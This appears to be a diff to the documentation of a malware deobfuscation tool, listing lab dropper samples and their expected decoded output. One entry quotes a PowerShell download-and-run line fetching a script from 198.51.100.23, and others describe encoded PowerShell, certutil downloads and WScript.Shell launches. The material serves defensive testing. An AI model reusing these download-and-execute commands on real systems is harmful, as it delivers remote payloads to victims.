@@ -77,9 +77,12 @@ Dropped/attached scripts whose intent only shows **after deobfuscation** — one
 | File | What you should see |
 |---|---|
 | `sample_dropper.js` | A `.js` whose whole body is `eval(unescape("%..%.."))` (one long run of percent escapes — the reference case). The multi-pass decoder peels it to a JScript dropper: `MSXML2.XMLHTTP` GET of `cdn-update.example.net`, then `WScript.Shell.Run` of `powershell … -enc <Base64>`. **JavaScript** tab. |
-| `sample_stage2.ps1` | A PowerShell stage-2 loader hidden behind backticks (`` I`E`X ``) + Base64 (`[Convert]::FromBase64String`). Deobfuscates to `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. **PowerShell** tab. |
+| `sample_obfuscatorio.js` | A `.js` obfuscated with **obfuscator.io** (string-array + rotator + accessor, control-flow flattening) — the scheme the pure-Python cascade can't flatten. With **webcrack** provisioned (portable Node), the Deobfuscated view shows the clean `function stage(){ … }` with the real URL, `powershell -enc …` and `ActiveXObject("WScript.Shell").Run`. **JavaScript** tab. |
+| `sample_stage2.ps1` | A PowerShell stage-2 loader hidden behind backticks (`` I`E`X ``) + Base64 (`[Convert]::FromBase64String`). Deobfuscates to `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. With **box-ps** provisioned (portable PowerShell Core), the PowerShell tab also shows a **Sandbox** section with the emulated behaviour. **PowerShell** tab. |
 | `sample_dropper.vbs` | A `.vbs` that builds the stage-2 URL from `Chr()` codes and runs PowerShell through an `Execute()` wrapper. The string resolver recovers the URL and unwraps the `WScript.Shell.Run`. **VBScript** tab. |
-| `lab/dropper_bundle.zip` | A plain ZIP bundling the three scripts above. Upload it to exercise the **recursive (nested)** path: each child is deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |
+| `sample_dropper.bat` | A `.bat` using caret escaping (`p^o^w^e^r^shell`) + `set` indirection (`%a%%b%`) to hide a `powershell -enc` launch and a `certutil -urlcache` download. The batch deobfuscator resolves it; rules fire for PowerShell/LOLBin/download. **Batch** tab. |
+| `sample_loader.hta` | An `.hta` carrying **both** a VBScript block (`WScript.Shell.Run powershell …`) and a JScript block (`MSXML2.XMLHTTP` GET + `WScript.Shell.Run`). Exercises HTA container extraction into the VBScript **and** JavaScript engines at once. |
+| `lab/dropper_bundle.zip` | A plain ZIP bundling the scripts above (`.js`, obfuscator.io `.js`, `.ps1`, `.vbs`, `.bat`, `.hta`). Upload it to exercise the **recursive (nested)** path: each child is deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |
 
 > The same engines run on these scripts wherever they hide — as a standalone upload, as an email/OLE attachment, or inside an archive — not only as loose files.
 
